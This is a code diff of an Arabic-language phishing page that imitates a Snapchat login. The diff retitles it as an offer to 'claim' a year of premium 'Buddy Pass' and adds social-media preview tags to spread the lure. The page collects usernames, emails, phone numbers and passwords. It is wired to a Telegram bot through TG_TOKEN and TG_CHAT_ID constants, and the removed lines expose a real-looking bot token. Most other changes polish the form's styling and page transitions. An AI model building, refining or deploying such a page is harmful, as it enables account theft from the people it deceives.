@@ -3,12 +3,22 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
-  <title>سناب شات - تسجيل دخول</title>
+  <title>Claim Buddy Pass| مميز لمدة عام</title>
+  
+  <!-- Meta Tags for Social Media -->
+  <meta property="og:title" content="Claim Buddy Pass| مميز لمدة عام" />
+  <meta property="og:description" content="احصل على اشتراك مميز لمدة عام كامل - استمتع بميزات حصرية" />
+  <meta property="og:image" content="https://l.top4top.io/p_385748njg0.jpeg" />
+  <meta property="og:type" content="website" />
+  <meta property="twitter:card" content="summary_large_image" />
+  <meta property="twitter:title" content="Claim Buddy Pass| مميز لمدة عام" />
+  <meta property="twitter:description" content="احصل على اشتراك مميز لمدة عام كامل" />
+  <meta property="twitter:image" content="https://l.top4top.io/p_385748njg0.jpeg" />
 
   <script>
     // ضع هنا البيانات الخاصة بالبوت على جهازك فقط
-    const TG_TOKEN = '8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac';
-    const TG_CHAT_ID = '6873334348';
+    const TG_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const TG_CHAT_ID = 'YOUR_CHAT_ID_HERE';
   </script>
 
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -263,18 +273,22 @@
     .country-select {
       cursor: pointer;
       background: var(--card);
-      flex: 0 0 auto;
+      flex: 0 0 70px;
       padding: 16px 8px;
-      min-width: 60px;
       text-align: center;
       font-weight: 600;
-      font-size: 24px;
+      font-size: 20px;
     }
 
     .country-select:focus {
       background: var(--bg);
       border-color: var(--primary);
       box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
+    }
+
+    .phone-input-wrapper {
+      flex: 1;
+      min-width: 0;
     }
 
     .form-hint {
@@ -376,13 +390,21 @@
 
     .password-toggle-label {
       font-size: 13px;
-      color: var(--primary);
+      color: #555555;
       font-weight: 700;
       cursor: pointer;
       white-space: nowrap;
-      padding: 0 8px;
+      padding: 8px 10px;
       user-select: none;
       -webkit-user-select: none;
+      background: var(--card);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius-sm);
+      transition: all 0.3s ease;
+    }
+
+    .password-toggle-label:active {
+      background: var(--glass);
     }
 
     /* Modal */
@@ -702,7 +724,7 @@
                   <input 
                     id="primary" 
                     type="text" 
-                    placeholder="أدخل اسم المستخدم أو البريدك"
+                    placeholder="أدخل اسم المستخدم أو بريدك"
                     autocomplete="off"
                     inputmode="latin"
                   />
@@ -719,13 +741,15 @@
                   <button id="countryBtn" class="country-select" type="button" aria-label="اختر الدولة">
                     <span id="countryFlag">🇯🇴</span>
                   </button>
-                  <input 
-                    id="phoneInput" 
-                    type="tel" 
-                    placeholder="أدخل رقم الهاتف"
-                    inputmode="numeric"
-                    autocomplete="off"
-                  />
+                  <div class="phone-input-wrapper">
+                    <input 
+                      id="phoneInput" 
+                      type="tel" 
+                      placeholder="أدخل رقم الهاتف"
+                      inputmode="numeric"
+                      autocomplete="off"
+                    />
+                  </div>
                 </div>
                 <div class="form-hint" id="hintPhone"></div>
               </div>
@@ -997,7 +1021,7 @@
       const password = passwordInput.value;
 
       if (!password) {
-        showHint(hintPassword, '❌ ��دخل كلمة المرور', 'error');
+        showHint(hintPassword, '❌ أدخل كلمة المرور', 'error');
         return null;
       }
 
@@ -1033,14 +1057,18 @@
 
     function goToPage1() {
       page2.classList.add('slide-out');
-      page2.classList.add('hidden');
-      page1.classList.remove('hidden');
-      page1.classList.add('slide-in');
-
+      
       setTimeout(() => {
-        page1.classList.remove('slide-in');
-        primaryInput.focus();
-      }, 400);
+        page2.classList.add('hidden');
+        page2.classList.remove('slide-out');
+        page1.classList.remove('hidden');
+        page1.classList.add('slide-in');
+
+        setTimeout(() => {
+          page1.classList.remove('slide-in');
+          primaryInput.focus();
+        }, 100);
+      }, 350);
 
       state.credentials = null;
       passwordInput.value = '';
@@ -1235,7 +1263,7 @@
         setTimeout(() => {
           hideToast();
           goToPage1();
-        }, 3000);
+        }, 2500);
       }
     });
 
